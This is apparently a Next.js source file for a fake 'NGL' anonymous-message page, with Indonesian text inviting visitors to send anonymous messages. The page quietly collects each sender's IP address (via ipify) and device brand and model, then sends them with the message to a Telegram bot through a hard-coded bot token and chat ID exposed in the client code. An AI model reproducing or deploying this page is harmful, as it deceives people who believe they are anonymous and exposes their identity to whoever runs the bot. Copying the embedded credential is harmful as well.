import { useState, useEffect } from "react";
import Head from "next/head";

export default function NGLPage() {
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [userInfo, setUserInfo] = useState({
    ip: "Tidak diketahui",
    device: {
      brand: "Tidak diketahui",
      model: "Tidak diketahui",
    },
  });

  useEffect(() => {
    // Ambil IP pengguna dan device info
    const fetchUserInfo = async () => {
      try {
        // Dapatkan IP Address
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();

        // Dapatkan Device Info
        const deviceInfo = getMobileInfo();

        setUserInfo({
          ip: ipData.ip,
          device: deviceInfo,
        });
      } catch (error) {
        console.error("Error fetching user info:", error);
      }
    };

    fetchUserInfo();
  }, []);

  const getMobileInfo = () => {
    const userAgent = navigator.userAgent;
    let deviceInfo = { brand: "Tidak diketahui", model: "Tidak diketahui" };

    if (/iPhone/i.test(userAgent)) {
      deviceInfo = { brand: "Apple", model: "iPhone" };
    } else if (/iPad/i.test(userAgent)) {
      deviceInfo = { brand: "Apple", model: "iPad" };
    } else if (/Android/i.test(userAgent)) {
      const match = userAgent.match(/Android\s([0-9\.]+).*?;\s([^\s;]+)/);
      if (match) {
        deviceInfo = { brand: "Android", model: match[2] || "Tidak diketahui" };
      }
    } else if (/Windows Phone/i.test(userAgent)) {
      deviceInfo = { brand: "Microsoft", model: "Windows Phone" };
    } else if (/BlackBerry/i.test(userAgent)) {
      deviceInfo = { brand: "BlackBerry", model: "BlackBerry Device" };
    } else if (/Opera Mini/i.test(userAgent)) {
      deviceInfo = { brand: "Opera", model: "Opera Mini" };
    }

    return deviceInfo;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const botToken = "8081447655:AAE1q_TUAd3SCToozFnZjdcF9jivRgd3eUU";
    const chatId = "1516343905";

    if (message.trim() === "") {
      alert("Pesan tidak boleh kosong!");
      return;
    }

    setLoading(true);
    setSuccess(false);

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: `Pesan anonim dari:
IP: ${userInfo.ip}
BRAND: ${userInfo.device.brand}
MODEL: ${userInfo.device.model}
PESAN: ${message}`,
          }),
        }
      );

      if (response.ok) {
        setMessage("");
        setSuccess(true);
      } else {
        alert("Gagal mengirim pesan. Coba lagi.");
      }
    } catch (error) {
      alert("Terjadi kesalahan. Coba lagi.");
    } finally {
      setLoading(false);
    }
  };

  const closePopup = () => {
    setSuccess(false);
  };

  return (
    <>
      <Head>
        <title>NGL - Pesan Anonim</title>
        <link
          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
          rel="stylesheet"
        />
      </Head>
      <div className="container">
        <form onSubmit={handleSubmit}>
          <div className="profile-message-box">
            <div className="profile">
              <img
                src="/default-avatar.png"
                alt="Profile picture"
                className="profile-image"
              />
              <div>
                <div className="username">@minn</div>
                <div className="message">Kirimi aku pesan anonim!</div>
              </div>
            </div>
            <textarea
              className="message-box"
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              placeholder="Tulis pesanmu di sini..."
              disabled={loading}
            ></textarea>
          </div>
          <button type="submit" className="send-button" disabled={loading}>
            {loading ? "Mengirim..." : "Kirim"}
          </button>
        </form>

        {/* Popup Sukses */}
        {success && (
          <div className="popup-success">
            <div className="popup-content">
              <i className="fas fa-check-circle"></i>
              <p>Pesan berhasil dikirim!</p>
              <button onClick={closePopup} className="popup-close">
                OK
              </button>
            </div>
          </div>
        )}
      </div>
      <style jsx>{`
        body {
          margin: 0;
          padding: 0;
          background: linear-gradient(135deg, #f37335, #f54ea2);
          font-family: Arial, sans-serif;
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
        }
        .container {
          width: 100%;
          max-width: 400px;
          margin: 20px auto;
        }
        .profile-message-box {
          background: white;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        }
        .profile {
          display: flex;
          align-items: center;
          margin-bottom: 10px;
        }
        .profile-image {
          width: 50px;
          height: 50px;
          border-radius: 50%;
          margin-right: 10px;
        }
        .username {
          font-size: 18px;
          font-weight: bold;
        }
        .message {
          font-size: 14px;
          color: #666;
        }
        .message-box {
          width: 100%;
          padding: 10px;
          margin: 10px 0;
          border: 1px solid #ccc;
          border-radius: 5px;
          font-size: 14px;
          resize: none;
        }
        .send-button {
          background-color: #ff416c;
          color: white;
          width: 100%;
          border: none;
          padding: 10px;
          border-radius: 5px;
          font-size: 16px;
          cursor: pointer;
        }
        .popup-success {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0, 0, 0, 0.5);
          display: flex;
          justify-content: center;
          align-items: center;
        }
        .popup-content {
          background: white;
          padding: 20px;
          border-radius: 10px;
          text-align: center;
        }
        .popup-close {
          background: #ff416c;
          color: white;
          border: none;
          padding: 10px;
          border-radius: 5px;
          cursor: pointer;
        }
      `}</style>
    </>
  );
}